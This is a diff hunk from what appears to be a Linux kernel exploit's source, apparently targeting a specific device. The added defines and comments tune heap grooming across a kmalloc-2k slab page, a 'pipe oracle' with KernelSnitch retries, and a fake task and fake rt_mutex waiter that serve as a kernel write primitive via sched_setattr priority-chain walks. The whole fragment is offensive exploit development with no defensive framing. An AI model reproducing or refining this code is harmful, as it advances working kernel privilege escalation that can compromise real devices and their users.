@@ -34,12 +34,24 @@
 #define SKB_DATA_DELTA (0LL)
 /* More mm KernelSnitch tries after a successful pipe oracle (was 2 → too few). */
 #define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 16
+/*
+ * RWC=48: fixed gate index 1 wrote somewhere mapped but not our pipe marker,
+ * and PI walks sometimes followed pi_tree.left into non-waiter memory. Rotate
+ * the pipe object index across attempts (0..15 = full kmalloc-2k slab page).
+ */
+#define P0_ORACLE_GATE_OBJECT_INDEX_ROTATE 1
 
 #define SLIDE_FAKE_WAITER_PRIO 0
 #define SLIDE_WAITER_WAKE_STATE 0
 #define SLIDE_LOCK_OWNER_VALUE 1ULL
 #define SLIDE_USE_FAKE_TASK 1
 #define COMPACT_RT_MUTEX_WAITER 1
+/*
+ * Empty fake_task.pi_waiters so sched_setattr → adjust_prio_chain cannot walk
+ * pi_tree.left (oracle write target) as a real waiter (RWC=48 NULL spinlock).
+ * Write primitive still lives on the pselect stack waiter + lock.waiters tree.
+ */
+#define SLIDE_EMPTY_FAKE_TASK_PI_WAITERS 1
 /* Live on device: cat .../sched_blocked_reason/id == 106 */
 #define SLIDE_TRACEFS_EVENT_ID 106
 /* Instruction after bl schedule in worker_thread */
